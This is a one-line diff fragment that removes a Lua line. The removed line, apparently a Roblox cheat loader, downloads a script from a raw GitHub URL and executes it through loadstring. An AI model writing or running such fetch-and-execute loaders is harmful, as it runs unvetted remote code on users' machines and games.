@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/fisch-horseman-spam7-8q3fuypinu8r1x.lua"))()
